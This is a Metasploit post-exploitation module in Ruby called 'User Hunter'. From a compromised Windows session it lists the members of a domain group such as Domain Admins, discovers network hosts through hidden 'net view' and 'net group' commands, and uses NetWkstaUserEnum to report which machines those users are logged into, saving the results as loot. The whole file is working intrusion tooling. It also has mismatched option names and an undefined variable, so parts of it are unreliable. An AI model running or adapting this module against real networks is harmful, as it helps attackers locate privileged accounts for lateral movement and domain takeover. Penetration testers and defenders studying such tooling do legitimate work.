##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##


require 'msf/core'
require 'rex'
require 'msf/core/post/common'

class Metasploit3 < Msf::Post

  include Msf::Post::Windows::Priv
  include Msf::Auxiliary::Report
  include Msf::Post::Common

  def initialize(info={})
    super(update_info(info,
      'Name'         => 'User Hunter',
      'Description'  => %q{
        This module takes either a username, userlist, or a domain group to query
        against the local DC for a set of users. It then takes a host list (or if none is
        specified, runs 'net view' to discover hosts on the network) and 
        uses NetWkstaUserEnum check each machine's logged in users against 
        the target userlist.

         This module pulls heavily from: local_admin_search_enum, enum_domain_group_users,
         and computer_browser_discovery.  
      },
      'License'      => MSF_LICENSE,
      'Author'       =>
        [
          '@harmj0y',
        ],
      'Platform'     => [ 'windows'],
      'SessionTypes' => [ 'meterpreter' ]
      ))

    register_options(
      [
        OptString.new('USERNAME', [false, 'Username to search for.']),
        OptPath.new('USERFILE', [false, 'File of usernames to search for.']),
        OptString.new('GROUP', [false, 'Domain Group to enumerate users from.', "Domain Admins"]),
        OptPath.new('HOSTFILE',[false, "File of hosts to search against."])
      ], self.class)
  end

  def run

    # check if the module is running as SYSTEM, which
    # will not pass any network credentials
    if is_system?
      print_error "Running as SYSTEM, module should be run with USER level rights"
      return

    else
      @adv = client.railgun.advapi32

      # get the local domain
      user = client.sys.config.getuid
      domain= user.split('\\')[0]

      target_user_list = []
      target_ip_list = []

      # if we have a specific username specified, append it to our target user list
      if !(datastore['USERNAME'].nil? or datastore['USERNAME'].empty?)
        target_user_list << datastore['USERNAME'].upcase.strip
      end

      # if we have a specific userlist specified, read everything in and
      # append to our target user list (one username per line)
      if !(datastore['USERLIST'].nil? or datastore['USERLIST'].empty?)
        if ::File.exists?(datastore['USERLIST'])
          print_status("Reading in user list: #{datastore['USERLIST']}.")
          ::File.open(datastore['USERLIST']).each do |n|
            target_user_list << n.upcase.strip
          end
        else
          print_error "User file #{datastore['USERLIST']} doesn't exist."
        end
      end

      # if we have a domain group specified, enumerate those users and 
      # append to the target user list
      if !(datastore['GROUP'].nil? or datastore['GROUP'].empty?)
        # grab all the users for this group in this domain
        domain_group_users = enum_domain_group_users(domain, datastore['GROUP'] )
        if domain_group_users.empty?
          print_error "No users found for group \"#{datastore['GROUP']}\""
        else
          # if users are found for this group, append them to our target user list
          target_user_list += domain_group_users
        end
      end

      # sanity check to make sure we have at least some users
      if target_user_list.empty?
        print_error("No users to target.")
        return
      end

      # if not hostlist is specified, query the DC for a user list
      if (datastore['HOSTLIST'].nil? or datastore['HOSTLIST'].empty?)
        print_status("Querying the DC for a list of active hosts...")
        target_ip_list = enum_domain_hosts()
      else
        # otherwise read in a host list for target IPs
        if ::File.exists?(datastore['HOSTLIST'])
          print_status("Reading in host list: #{datastore['HOSTLIST']}.")
          ::File.open(datastore['HOSTLIST']).each do |n|
            target_ip_list << n
          end
        else
          print_error "Host file #{datastore['HOSTLIST']} doesn't exist."
          return
        end
      end

      # build our formatted output table
      results = Rex::Ui::Text::Table.new(
        'Header' => "Logged In Users for Group: #{datastore['GROUP']}",
        'Indent' => 2,
        'Columns' => ['IP', 'Logged In Users']
      )

      # sanity check on the number of target hosts
      if target_ip_list.nil? or target_ip_list.empty?
        print_error "No hosts to target."
        return
      else
        # otherwise start enumerating each of our targets
        target_ip_list.each do |ip|
          host_users = enum_host(ip, target_user_list)
          results << [ip, host_users.join(",")]
        end
      end

      # store the found users/targets loot
      store_loot("group.loggedin.users", "text/plain", session, results.to_s, "group.loggedin.users.txt", "Group Logged In Users")
      print_status("logged in users stored in loot")

    end

  end

  # uses "net view" to query the domain for a set host list and
  # resolve the IP for each host
  # "net view" implicitly calls NetServerEnum underneath
  #   https://www.microsoft.com/resources/documentation/windowsnt/4/server/reskit/en-us/net/chptr3.mspx?mfr=true
  def enum_domain_hosts()

    client = session
    domain = nil
    foundips = Array.new

    hosts = []
    resultHosts = []

    if client.platform =~ /^x64/
      size = 64
      addrinfoinmem = 32
    else
      size = 32
      addrinfoinmem = 24
    end

    # query the domain for users of this particular group and then parse the results
    results = (run_cmd("net view")).split("\n")
    
    if results.include?("System error 5 has occurred.\r")
      print_error("Issue enumerating users for group \"#{domain_group}\"")
      print_error("Try migrating into a different user process.")
      return []
    end

    # Get group members from the output
    results.each do |line|
      if line.start_with?("\\\\")
        host = line.split("\\\\")[1].strip()
        vprint_status("Found host: #{host}")
        hosts << host
      end
    end

    # use railgun to resolve the IPs for each host
    begin
      hosts.each do |x|
        vprint_status("Looking up IP for #{x}")
          
        result = client.railgun.ws2_32.getaddrinfo(x, nil, nil, 4 )
        if result['GetLastError'] == 11001
          print_error("There was an error resolving the IP for #{x}")
          next
        end
        # parse the railgun results
        addrinfo = client.railgun.memread( result['ppResult'], size )
        ai_addr_pointer = addrinfo[addrinfoinmem,4].unpack('L').first
        sockaddr = client.railgun.memread( ai_addr_pointer, size/2 )
        ip = sockaddr[4,4].unpack('N').first

        temp = {}
        temp[:hostname] = x
        temp[:ip] = Rex::Socket.addr_itoa(ip)
        temp[:ip] = '' unless temp[:ip]

        # ignore the localhost if it pops up
        if temp[:ip] != "0.0.0.0"
          resultHosts << temp
        end
        
      end

    rescue ::Exception => e
      print_error("Error: #{e}")
      print_status('Windows 2000 and prior does not support getaddrinfo')
    end

    # build or formatted output table
    results = Rex::Ui::Text::Table.new(
      'Header' => 'net view results',
      'Indent' => 2,
      'Columns' => ['IP', 'COMPUTER NAME']
    )

    # store off the results for each found host
    resultHosts.each do |x|
      results << [x[:ip], x[:hostname]]
      foundips << x[:ip]
    end

    # store the discovered hosts off as loot.
    print_status("discovered hosts stored in loot")
    store_loot("discovered.hosts", "text/plain", session, results.to_s, "discovered_hosts.txt", "Computer Browser Discovered Hosts")

    return foundips

  end

  # enumerates all the users in a particular domain group
  # by calling "net group 'group name' /domain" and parsing the results
  def enum_domain_group_users(domain, domain_group)
    
    members = []

    # query the domain for users of this particular group and then parse the results
    results = (run_cmd("net group \"#{domain_group}\" /domain")).split("\n")
    
    if results.include?("System error 5 has occurred.\r")
      print_error("Issue enumerating users for group \"#{domain_group}\"")
      print_error("Try migrating into a different user process.")
      return []
    end

    # Usernames start somewhere around line 6
    results = results.slice(6, results.length)
    # Get group members from the output
    results.each do |line|
      line.split("  ").compact.each do |user|
        next if user.strip == ""
        next if user =~ /-----/
        next if user =~ /The command completed successfully/
        members << "#{domain}\\#{user.upcase.strip}"
      end
    end
    return members
  end

  # http://msdn.microsoft.com/en-us/library/windows/desktop/aa370669(v=vs.85).aspx
  # enumerate logged in users - adapted from local_admin_search_enum
  def enum_loggedin_users(host)

    userlist = Array.new

    begin
      # Connect to host and enumerate logged in users
      winsessions = client.railgun.netapi32.NetWkstaUserEnum("\\\\#{host}", 1, 4, -1, 4, 4, nil)
    rescue ::Exception => e
      print_error("Issue enumerating users on #{host}")
      return userlist
    end

    return userlist if winsessions.nil?

    count = winsessions['totalentries'] * 2
    startmem = winsessions['bufptr']

    base = 0
    userlist = Array.new
    # grab the resulting memory structure from the railgun call
    begin
      mem = client.railgun.memread(startmem, 8*count)
    rescue ::Exception => e
      print_error("Issue reading memory for #{host}")
      vprint_error(e.to_s)
      return userlist
    end

    # weird memory adjustment stuffs
    if client.platform =~ /^x64/
      itr = 16
      count = count / 2
    else
      itr = 8
    end

    begin
      count.times{|i|

        # grab the memory pointers to the host and domain names and extract them
        userptr = mem[(base + 0),4].unpack("V*")[0]
        domainptr = mem[(base + itr/2),4].unpack("V*")[0]
        user = client.railgun.memread(userptr,255).split("\0\0")[0].split("\0").join
        domain = client.railgun.memread(domainptr,255).split("\0\0")[0].split("\0").join

        unless user.empty?
          line = "#{domain}\\#{user}"
          # only add this domain\user if it doesn't already exist in the list
          userlist << line.upcase.strip unless userlist.include? line.upcase.strip
        end

        base = base + itr
      }
    rescue ::Exception => e
      print_error("Issue enumerating users on #{host}: #{e}")
      vprint_error(e.backtrace)
    end

    return userlist
  end

  # kick off logged in user enumeration for a specific host and compare the
  # results against the target host list
  def enum_host(host, target_user_list)
    if @adv.nil?
      return
    end

    # get all the logged in users for this host
    host_users = enum_loggedin_users(host)

    # check the resulting users from the host against the target user list
    host_users.each do |user|
      vprint_status("target_user_list: #{target_user_list}")
      if target_user_list.any? { |w| w.upcase.strip.include?(user) }
        print_good("#{host} : user \"#{user}\" logged in")
        report_host(host, user)
      end
    end

    return host_users

  end

  # report to the database that our host has a target user logged in
  def report_host(host, username)
    report_note(
      :host   => host,
      :type   => 'user.hunter',
      :data   => username,
      :update => :unique_data
    )
  end

  # run a specific hidden command on the session and return the result
  # stolen from enum_domain_group_users
  def run_cmd(cmd)
    process = session.sys.process.execute(cmd, nil, {'Hidden' => true, 'Channelized' => true})
    res = ""
    while (d = process.channel.read)
      break if d == ""
      res << d
    end
    process.channel.close
    process.close
    return res
  end

end
